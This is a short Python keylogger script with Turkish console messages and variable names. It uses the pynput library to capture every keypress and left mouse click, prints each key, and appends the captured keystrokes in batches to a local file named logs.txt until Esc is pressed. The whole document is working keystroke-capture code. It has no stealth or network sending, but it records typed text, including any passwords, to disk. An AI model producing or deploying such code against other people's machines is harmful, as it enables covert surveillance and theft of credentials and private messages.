from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener, Button

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} tuşuna basıldı!".format(str(key)))

    if count >= 10:
        write_file(keys)
        keys.clear()
        count = 0

def on_click(x, y, button, pressed):
    if not pressed and button == Button.left:
        keys.append('\n')

def write_file(keys):
    with open("logs.txt", "a") as file:
        for key in keys:
            kelime = str(key).replace("'", "")
            if kelime.find("Key"):
                file.write(str(kelime))
def on_release(key):
    if key == Key.esc:
        return False
with MouseListener(on_click=on_click) as mlistener:
    with Listener(on_press=on_press, on_release=on_release) as klistener:
        klistener.join()